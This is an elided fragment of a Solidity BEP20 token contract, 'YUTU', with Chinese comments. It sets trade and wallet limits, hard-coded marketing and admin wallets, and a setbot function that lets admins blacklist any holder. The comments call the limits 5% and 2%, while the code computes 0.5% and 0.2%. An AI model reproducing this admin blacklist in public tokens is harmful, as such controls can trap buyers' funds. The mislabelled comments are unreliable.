...
contract YUTU is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        uint256 _real= 1000000000* 10**_decimals;

        RewardToken = 0x55d398326f99059fF775485246999027B3197955;
		
		_maxTxAmount = _real.mul(5).div(1000);//最大买百分之5
		_walletMax = _real.mul(5).div(1000);//钱包最大持有百分之5
		swapThreshold = _real.mul(2).div(1000);//最大卖出百分之2
        ...
        marketingWallet = 0xadfBF414dB3f5bA2d591a4894A0937E7fb5B10BF;  //营销钱包地址
        another = [0x6946B494a408ef46F1614aFD80B0AA1D5b36E0AF,0xAc96070121155Db7e43a8f23E1fd894113F9035E];     //管理员地址2个
    ...
    function setbot(address _user) external authorized {
        require(!isXXKING[_user], "set bot");
        isXXKING[_user] = true;
        // 拉黑
    }
